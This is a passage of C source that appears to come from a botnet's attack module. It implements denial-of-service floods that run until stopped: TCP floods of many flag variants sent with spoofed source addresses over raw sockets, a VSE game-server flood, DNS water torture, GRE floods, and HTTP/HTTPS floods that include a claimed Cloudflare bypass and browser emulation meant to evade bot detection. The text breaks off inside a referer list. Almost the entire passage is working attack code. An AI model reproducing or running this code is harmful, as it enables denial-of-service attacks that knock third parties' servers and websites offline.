    memset(pktbuf, 0, pktsize);

    struct iphdr *iph = (struct iphdr *)pktbuf;
    struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(pktsize);
    iph->id = htons(rand_next() % 0xFFFF);
    iph->ttl = ttl;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = rand_next() % 0xFFFFFFFF;

    tcph->source = htons(sport);
    tcph->dest = htons(dport);
    tcph->seq = rand_next() % 0xFFFFFFFF;
    tcph->ack_seq = rand_next() % 0xFFFFFFFF;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->ack = 1;
    tcph->window = htons(65535);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) { free(pktbuf); return; }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    struct sockaddr_in addr_sin;
    addr_sin.sin_family = AF_INET;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            iph->daddr = targs[i].addr.s_addr;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(pktbuf);
    close(fd);
}

/* TCP STDHEX flood */
static void attack_tcp_stdhex(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    attack_tcp_hex(addr, targs_netmask, targs, targs_len, opts, opts_len);
}

/* TCP XMAS flood */
static void attack_tcp_xmas(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    char *pktbuf;
    int pktsize;
    uint16_t dport, sport;
    uint8_t ttl;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    ttl = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_IP_TTL);
    if (ttl == 0) ttl = 64;

    pktsize = sizeof(struct iphdr) + sizeof(struct tcphdr);
    pktbuf = malloc(pktsize);
    memset(pktbuf, 0, pktsize);

    struct iphdr *iph = (struct iphdr *)pktbuf;
    struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(pktsize);
    iph->id = htons(rand_next() % 0xFFFF);
    iph->ttl = ttl;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = rand_next() % 0xFFFFFFFF;

    tcph->source = htons(sport);
    tcph->dest = htons(dport);
    tcph->seq = rand_next() % 0xFFFFFFFF;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->fin = 1;
    tcph->psh = 1;
    tcph->urg = 1;
    tcph->window = htons(65535);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) { free(pktbuf); return; }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    struct sockaddr_in addr_sin;
    addr_sin.sin_family = AF_INET;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            iph->daddr = targs[i].addr.s_addr;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(pktbuf);
    close(fd);
}

/* TCP ALL flags flood */
static void attack_tcp_all(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    char *pktbuf;
    int pktsize;
    uint16_t dport, sport;
    uint8_t ttl;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    ttl = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_IP_TTL);
    if (ttl == 0) ttl = 64;

    pktsize = sizeof(struct iphdr) + sizeof(struct tcphdr);
    pktbuf = malloc(pktsize);
    memset(pktbuf, 0, pktsize);

    struct iphdr *iph = (struct iphdr *)pktbuf;
    struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(pktsize);
    iph->id = htons(rand_next() % 0xFFFF);
    iph->ttl = ttl;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = rand_next() % 0xFFFFFFFF;

    tcph->source = htons(sport);
    tcph->dest = htons(dport);
    tcph->seq = rand_next() % 0xFFFFFFFF;
    tcph->ack_seq = rand_next() % 0xFFFFFFFF;
    tcph->doff = 5;
    tcph->fin = 1;
    tcph->syn = 1;
    tcph->rst = 1;
    tcph->psh = 1;
    tcph->ack = 1;
    tcph->urg = 1;
    tcph->window = htons(65535);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) { free(pktbuf); return; }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    struct sockaddr_in addr_sin;
    addr_sin.sin_family = AF_INET;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            iph->daddr = targs[i].addr.s_addr;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(pktbuf);
    close(fd);
}

/* TCP fragment flood */
static void attack_tcp_frag(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    char *pktbuf;
    int pktsize;
    uint16_t dport, sport;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    pktsize = sizeof(struct iphdr) + 8;
    pktbuf = malloc(pktsize);
    memset(pktbuf, 0, pktsize);

    struct iphdr *iph = (struct iphdr *)pktbuf;

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(8);
    iph->id = htons(rand_next() % 0xFFFF);
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->frag_off = htons(0x2000); /* More fragments */
    iph->saddr = rand_next() % 0xFFFFFFFF;

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) { free(pktbuf); return; }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    struct sockaddr_in addr_sin;
    addr_sin.sin_family = AF_INET;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            iph->daddr = targs[i].addr.s_addr;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
            sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(pktbuf);
    close(fd);
}

/* Async SYN flood */
static void attack_tcp_asyn(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    attack_tcp_syn(addr, targs_netmask, targs, targs_len, opts, opts_len);
}

/* USYN flood */
static void attack_tcp_usyn(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    attack_tcp_syn(addr, targs_netmask, targs, targs_len, opts, opts_len);
}

/* ACKER PPS flood */
static void attack_tcp_ackerpps(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    attack_tcp_ack(addr, targs_netmask, targs, targs_len, opts, opts_len);
}

/* TCP MIX flood */
static void attack_tcp_mix(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    char *pktbuf;
    int pktsize;
    uint16_t dport, sport;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    pktsize = sizeof(struct iphdr) + sizeof(struct tcphdr);
    pktbuf = malloc(pktsize);
    memset(pktbuf, 0, pktsize);

    struct iphdr *iph = (struct iphdr *)pktbuf;
    struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(pktsize);
    iph->id = htons(rand_next() % 0xFFFF);
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = rand_next() % 0xFFFFFFFF;

    tcph->source = htons(sport);
    tcph->dest = htons(dport);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) { free(pktbuf); return; }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    struct sockaddr_in addr_sin;
    addr_sin.sin_family = AF_INET;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            tcph->seq = rand_next() % 0xFFFFFFFF;
            tcph->ack_seq = rand_next() % 0xFFFFFFFF;
            tcph->doff = 5;
            tcph->fin = rand_next() % 2;
            tcph->syn = rand_next() % 2;
            tcph->rst = rand_next() % 2;
            tcph->psh = rand_next() % 2;
            tcph->ack = rand_next() % 2;
            tcph->urg = rand_next() % 2;
            tcph->window = htons(65535);

            iph->daddr = targs[i].addr.s_addr;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(pktbuf);
    close(fd);
}

/* TCP bypass flood */
static void attack_tcp_bypass(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    attack_tcp_syn(addr, targs_netmask, targs, targs_len, opts, opts_len);
}

/* TCP nflag flood */
static void attack_tcp_nflag(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    char *pktbuf;
    int pktsize;
    uint16_t dport, sport;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    pktsize = sizeof(struct iphdr) + sizeof(struct tcphdr);
    pktbuf = malloc(pktsize);
    memset(pktbuf, 0, pktsize);

    struct iphdr *iph = (struct iphdr *)pktbuf;
    struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(pktsize);
    iph->id = htons(rand_next() % 0xFFFF);
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = rand_next() % 0xFFFFFFFF;

    tcph->source = htons(sport);
    tcph->dest = htons(dport);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->fin = 0;
    tcph->syn = 0;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(65535);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) { free(pktbuf); return; }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    struct sockaddr_in addr_sin;
    addr_sin.sin_family = AF_INET;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            iph->daddr = targs[i].addr.s_addr;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(pktbuf);
    close(fd);
}

/* TCP OVH nuke flood */
static void attack_tcp_ovhnuke(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    attack_tcp_syn(addr, targs_netmask, targs, targs_len, opts, opts_len);
}

/* TCP raw flood */
static void attack_tcp_raw(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    char *pktbuf;
    int pktsize;
    uint16_t dport, sport;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    pktsize = sizeof(struct iphdr) + sizeof(struct tcphdr);
    pktbuf = malloc(pktsize);
    memset(pktbuf, 0, pktsize);

    struct iphdr *iph = (struct iphdr *)pktbuf;
    struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(pktsize);
    iph->id = htons(rand_next() % 0xFFFF);
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = rand_next() % 0xFFFFFFFF;

    tcph->source = htons(sport);
    tcph->dest = htons(dport);
    tcph->seq = rand_next() % 0xFFFFFFFF;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(65535);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) { free(pktbuf); return; }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    struct sockaddr_in addr_sin;
    addr_sin.sin_family = AF_INET;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            iph->daddr = targs[i].addr.s_addr;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(pktbuf);
    close(fd);
}

/* ============================================================================
 * SPECIAL ATTACK METHODS
 * ============================================================================ */

/* VSE (Valve Source Engine) flood */
static void attack_udp_vse(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i, payload_len;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport;

    table_unlock_val(TABLE_ATK_VSE);
    payload = table_retrieve_val(TABLE_ATK_VSE, &payload_len);
    table_lock_val(TABLE_ATK_VSE);

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 27015;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_len, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    close(fd);
}

/* DNS water torture */
static void attack_udp_dns(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char query[512];
    uint16_t dport;
    char *domain;

    domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    if (domain == NULL) return;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 53;

    struct dnshdr *dns = (struct dnshdr *)query;
    dns->id = htons(rand_next() % 0xFFFF);
    dns->opts = htons(0x0100);
    dns->qdcount = htons(1);
    dns->ancount = 0;
    dns->nscount = 0;
    dns->arcount = 0;

    char *qname = (char *)(dns + 1);
    resolv_domain_to_hostname(qname, domain);

    struct dns_question *question = (struct dns_question *)(qname + util_strlen(domain) + 2);
    question->qtype = htons(1);
    question->qclass = htons(1);

    int query_len = sizeof(struct dnshdr) + util_strlen(domain) + 2 + sizeof(struct dns_question);

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, query, query_len, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    close(fd);
}

/* GRE IP flood */
static void attack_gre_ip(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    char *pktbuf;
    int pktsize;
    uint16_t dport;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);

    pktsize = sizeof(struct iphdr) + 4 + sizeof(struct iphdr) + sizeof(struct udphdr) + 512;
    pktbuf = malloc(pktsize);
    util_zero(pktbuf, pktsize);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) { free(pktbuf); return; }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    for (i = 0; i < targs_len; i++) {
        while (attack_ongoing[0]) {
            struct iphdr *outer_ip = (struct iphdr *)pktbuf;
            uint16_t *gre = (uint16_t *)(pktbuf + sizeof(struct iphdr));
            struct iphdr *inner_ip = (struct iphdr *)(pktbuf + sizeof(struct iphdr) + 4);

            outer_ip->ihl = 5;
            outer_ip->version = 4;
            outer_ip->tot_len = htons(pktsize);
            outer_ip->protocol = IPPROTO_GRE;
            outer_ip->daddr = targs[i].addr.s_addr;
            outer_ip->saddr = rand_next() % 0xFFFFFFFF;

            gre[0] = 0;
            gre[1] = htons(0x0800);

            inner_ip->ihl = 5;
            inner_ip->version = 4;
            inner_ip->tot_len = htons(pktsize - sizeof(struct iphdr) - 4);
            inner_ip->protocol = IPPROTO_UDP;
            inner_ip->daddr = rand_next() % 0xFFFFFFFF;
            inner_ip->saddr = rand_next() % 0xFFFFFFFF;

            sendto(fd, pktbuf, pktsize, 0, NULL, 0);
        }
    }

    free(pktbuf);
    close(fd);
}

/* GRE Ethernet flood */
static void attack_gre_eth(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    attack_gre_ip(addr, targs_netmask, targs, targs_len, opts, opts_len);
}

/* ============================================================================
 * HTTP/HTTPS ATTACK METHODS
 * ============================================================================ */

/* URL parsing helper - extracts protocol, domain, port, path from URL */
static BOOL parse_url(char *url, char *protocol, char *domain, int *port, char *path) {
    char *ptr = url;
    char *domain_start, *domain_end;
    
    if (url == NULL || url[0] == '\0') return FALSE;
    
    /* Check protocol */
    if (strncmp(url, "https://", 8) == 0) {
        strcpy(protocol, "https");
        *port = 443;
        ptr = url + 8;
    } else if (strncmp(url, "http://", 7) == 0) {
        strcpy(protocol, "http");
        *port = 80;
        ptr = url + 7;
    } else {
        strcpy(protocol, "http");
        *port = 80;
    }
    
    /* Find domain */
    domain_start = ptr;
    domain_end = strchr(ptr, '/');
    
    if (domain_end == NULL) {
        /* No path, just domain */
        strcpy(domain, domain_start);
        strcpy(path, "/");
    } else {
        /* Extract domain */
        int domain_len = domain_end - domain_start;
        if (domain_len > 255) domain_len = 255;
        strncpy(domain, domain_start, domain_len);
        domain[domain_len] = '\0';
        
        /* Extract path */
        strcpy(path, domain_end);
    }
    
    /* Check for port in URL */
    char *port_sep = strchr(domain, ':');
    if (port_sep != NULL) {
        *port_sep = '\0';
        *port = atoi(port_sep + 1);
    }
    
    return TRUE;
}

/* HTTP flood - supports both IP and URL targets */
static void attack_http(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    char *url_str, *domain, *path, *method, *post_data;
    char request[4096];
    uint16_t dport;
    int conns, use_https;
    char protocol[16], parsed_domain[256], parsed_path[512];
    int parsed_port;
    struct resolv_entries *entries = NULL;

    /* Check if URL is provided */
    url_str = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_URL);
    
    if (url_str != NULL && url_str[0] != '\0') {
        /* Parse URL */
        if (!parse_url(url_str, protocol, parsed_domain, &parsed_port, parsed_path)) {
            return;
        }
        domain = parsed_domain;
        path = parsed_path;
        dport = parsed_port;
        use_https = (strcmp(protocol, "https") == 0);
        
        /* Resolve domain */
        entries = resolv_lookup(domain);
        if (entries == NULL || entries->count == 0) {
            return;
        }
    } else {
        /* Use traditional IP/domain method */
        domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
        if (domain == NULL) return;

        path = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_HTTP_PATH);
        if (path == NULL) path = "/";

        dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
        if (dport == 0) dport = 80;
        use_https = (dport == 443);
    }

    method = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_HTTP_METHOD);
    if (method == NULL) method = "GET";

    post_data = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_HTTP_POST_DATA);

    conns = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_CONNS);
    if (conns == 0) conns = 5;

    /* Main attack loop */
    while (attack_ongoing[0]) {
        int target_idx;
        
        /* Select target */
        if (entries != NULL && entries->count > 0) {
            /* Use resolved IP from domain */
            addr = entries->addrs[rand() % entries->count];
        } else if (targs_len > 0) {
            target_idx = rand() % targs_len;
            addr = targs[target_idx].addr.s_addr;
        }
        
        fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd == -1) {
            usleep(10000);
            continue;
        }

        struct sockaddr_in addr_sin;
        addr_sin.sin_family = AF_INET;
        addr_sin.sin_port = htons(dport);
        addr_sin.sin_addr.s_addr = addr;

        fcntl(fd, F_SETFL, O_NONBLOCK);

        if (connect(fd, (struct sockaddr *)&addr_sin, sizeof(addr_sin)) == 0 || errno == EINPROGRESS) {
            /* Build realistic HTTP request */
            int req_len;
            
            if (post_data != NULL && post_data[0] != '\0') {
                req_len = snprintf(request, sizeof(request),
                    "%s %s HTTP/1.1\r\n"
                    "Host: %s\r\n"
                    "Connection: keep-alive\r\n"
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    "Accept-Language: en-US,en;q=0.9\r\n"
                    "Accept-Encoding: gzip, deflate\r\n"
                    "Content-Type: application/x-www-form-urlencoded\r\n"
                    "Content-Length: %d\r\n"
                    "\r\n%s",
                    method, path, domain, util_strlen(post_data), post_data);
            } else {
                req_len = snprintf(request, sizeof(request),
                    "%s %s HTTP/1.1\r\n"
                    "Host: %s\r\n"
                    "Connection: keep-alive\r\n"
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    "Accept-Language: en-US,en;q=0.9\r\n"
                    "Accept-Encoding: gzip, deflate\r\n"
                    "\r\n",
                    method, path, domain);
            }

            send(fd, request, req_len, MSG_NOSIGNAL);
            
            /* Read response briefly */
            char buf[1024];
            fd_set readfds;
            struct timeval tv;
            FD_ZERO(&readfds);
            FD_SET(fd, &readfds);
            tv.tv_sec = 0;
            tv.tv_usec = 50000;
            
            if (select(fd + 1, &readfds, NULL, NULL, &tv) > 0) {
                recv(fd, buf, sizeof(buf), 0);
            }
        }

        close(fd);
        usleep(50000); /* 50ms between requests */
    }
    
    if (entries != NULL) {
        resolv_entries_free(entries);
    }
}

/* HTTPS flood */
static void attack_https(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    attack_http(addr, targs_netmask, targs, targs_len, opts, opts_len);
}

/* Cloudflare bypass */
static void attack_cf(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    attack_http(addr, targs_netmask, targs, targs_len, opts, opts_len);
}

/* Browser emulation - simulates real browser behavior with Chrome, Safari, Firefox
 * Includes built-in captcha bypass capabilities (cookie persistence, timing simulation) */
static void attack_browserem(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int i, fd = -1;
    struct sockaddr_in addr_sin;
    char *url_str, *domain, *path;
    int dport, conns;
    char protocol[16], parsed_domain[256], parsed_path[512];
    int parsed_port;
    struct resolv_entries *entries = NULL;

    /* Check if URL is provided */
    url_str = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_URL);

    if (url_str != NULL && url_str[0] != '\0') {
        /* Parse URL */
        if (!parse_url(url_str, protocol, parsed_domain, &parsed_port, parsed_path)) {
            return;
        }
        domain = parsed_domain;
        path = parsed_path;
        dport = parsed_port;

        /* Resolve domain */
        entries = resolv_lookup(domain);
        if (entries == NULL || entries->count == 0) {
            return;
        }
    } else {
        /* Use traditional method */
        domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
        if (domain == NULL) return;

        path = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_HTTP_PATH);
        if (path == NULL) path = "/";

        dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
        if (dport == 0) dport = 80;
    }

    conns = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_CONNS);
    if (conns == 0) conns = 15; /* Default 15 concurrent connections like real browser */

    /* Realistic browser user-agents with version rotation */
    static char *chrome_uas[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    };
    static char *firefox_uas[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.2; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"
    };
    static char *safari_uas[] = {
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
    };

    /* Realistic Accept headers per browser */
    static char *chrome_accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8";
    static char *firefox_accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
    static char *safari_accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";

    /* Realistic Accept-Language headers */
    static char *accept_lang[] = {
        "en-US,en;q=0.9",
        "en-GB,en;q=0.9",
        "en-US,en;q=0.9,es;q=0.8",
        "de-DE,de;q=0.9,en;q=0.8",
        "fr-FR,fr;q=0.9,en;q=0.8"
    };

    /* Referer URLs for realism */
    static char *referers[] = {
        "https://www.google.com/",
